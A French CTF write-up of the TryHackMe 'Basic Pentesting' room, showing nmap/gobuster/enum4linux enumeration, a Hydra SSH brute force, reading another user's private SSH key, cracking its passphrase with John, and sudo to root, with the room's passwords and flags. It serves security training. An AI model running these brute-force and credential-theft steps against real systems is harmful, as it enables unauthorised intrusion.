# Write-up : TryHackMe - Basic Pentesting

**Date :** 02/01/2026
**Auteur :** SAINTY Yann
**Cat√©gorie :** Network / Linux / Brute-force
**Difficult√© :** Facile
**Lien :** [TryHackMe | Basic Pentesting](https://tryhackme.com/room/basicpentestingjt)

---

## 1. Introduction & Sc√©nario

"Basic Pentesting" est une machine con√ßue pour pratiquer les fondamentaux du test d'intrusion r√©seau. L'objectif est de compromettre la machine en passant par toutes les √©tapes classiques : √©num√©ration des services, exploitation par force brute, mouvement lat√©ral (pivoting) entre utilisateurs, et enfin escalade de privil√®ges vers Root.
Le sc√©nario implique deux utilisateurs, **Jan** et **Kay**, dont la s√©curit√© laisse √† d√©sirer.

---

## 2. Reconnaissance & √ânum√©ration

### Scan Nmap

Je commence par scanner les ports pour identifier la surface d'attaque avec les scripts de d√©tection par d√©faut et les versions.

```bash
nmap -sC -sV 10.82.160.27

```

**R√©sultats du scan :**

* **Port 22 (SSH) :** OpenSSH 8.2p1.
* **Port 80 (HTTP) :** Apache 2.4.41.
* **Ports 139 & 445 (SMB) :** Samba (smbd 4).

### √ânum√©ration Web

Une recherche de r√©pertoires cach√©s avec **Gobuster** r√©v√®le un dossier int√©ressant :

```bash
gobuster dir -u http://10.82.160.27 -w /usr/share/wordlists/dirb/common.txt
# R√©sultat : /development

```

Dans ce dossier `/development`, je trouve deux notes (`dev.txt`, `j.txt`) indiquant un √©change entre les utilisateurs **J** et **K**.

> **Indice critique :** K mentionne que J a un mot de passe faible et que SMB a √©t√© configur√© r√©cemment.

### √ânum√©ration SMB

J'utilise `enum4linux` pour lister les informations via le protocole Samba (ports 139/445).

```bash
enum4linux -a 10.82.160.27

```

Cela me confirme l'existence de deux comptes utilisateurs valides sur le syst√®me : **jan** et **kay**.

---

## 3. Acc√®s Initial (Brute-force SSH)

Sachant que l'utilisateur `jan` a un mot de passe faible, je lance une attaque par dictionnaire avec **Hydra** et la liste `rockyou.txt`.

```bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.82.160.27 -t 4

```

**R√©sultat :**
Hydra trouve rapidement le mot de passe : `armando`.

Je me connecte en SSH :

```bash
ssh jan@10.82.160.27

```

---

## 4. Mouvement Lat√©ral (Jan ‚Üí Kay)

Une fois connect√© en tant que `jan`, je fouille le syst√®me. Je remarque que je n'ai pas les droits pour lire les fichiers personnels de `kay`, mais je tente de voir si sa cl√© priv√©e SSH est lisible.

```bash
ls -la /home/kay/.ssh
cat /home/kay/.ssh/id_rsa

```

**D√©couverte :** La cl√© priv√©e est lisible par tout le monde ! C'est une erreur de permission critique.

### Extraction et Cassage de la Cl√© (Crack)

Je copie la cl√© sur ma machine d'attaque locale dans un fichier `kay_key` et je restreins les permissions (`chmod 600 kay_key`).
En tentant de l'utiliser, SSH demande une **passphrase**. Je dois donc la cracker.

1. **Conversion en hash (ssh2john) :**
```bash
/usr/share/john/ssh2john.py kay_key > key_hash.txt

```


2. **Attaque avec John The Ripper :**
```bash
john --wordlist=rockyou.txt key_hash.txt

```



**R√©sultat :** La passphrase est `beeswax`.

### Connexion en tant que Kay

Je peux maintenant me connecter directement en tant que Kay sans son mot de passe syst√®me, gr√¢ce √† sa cl√© SSH :

```bash
ssh -i kay_key kay@10.82.160.27
# Passphrase : beeswax

```

Je r√©cup√®re le premier flag dans le fichier `pass.bak` :
`heresareallystrongpasswordthatfollowsthepasswordpolicy$$`

---

## 5. Escalade de Privil√®ges (Root)

Maintenant connect√© en tant que `kay`, je v√©rifie mes droits administrateur (sudoers).

```bash
sudo -l

```

**R√©sultat :**

```text
(ALL : ALL) ALL

```

L'utilisateur `kay` a tous les droits sudo. Cependant, pour utiliser `sudo`, il faut le mot de passe du compte Kay (pas la passphrase SSH).
Heureusement, le mot de passe se trouvait dans le fichier `pass.bak` que je viens de lire.

Je deviens root :

```bash
sudo su
# Mot de passe : heresareallystrongpasswordthatfollowsthepasswordpolicy$$

```

Je r√©cup√®re le flag final :

```bash
cat /root/flag.txt

```

---

## Conclusion

Ce challenge illustre parfaitement pourquoi la d√©fense en profondeur est n√©cessaire :

1. **Faiblesse des mots de passe :** Jan utilise un mot de passe pr√©sent dans les dictionnaires communs (`armando`), ce qui permet l'intrusion initiale.
2. **Permissions Linux (Permissions Creep) :** La cl√© SSH de Kay √©tait lisible par un autre utilisateur (Jan), permettant le mouvement lat√©ral.
3. **Force du mot de passe vs Cl√© SSH :** Kay avait un mot de passe syst√®me tr√®s fort (50+ caract√®res), mais sa cl√© SSH √©tait prot√©g√©e par une passphrase faible (`beeswax`), rendant la robustesse du mot de passe inutile.

**Machine pwned !** üíÄ
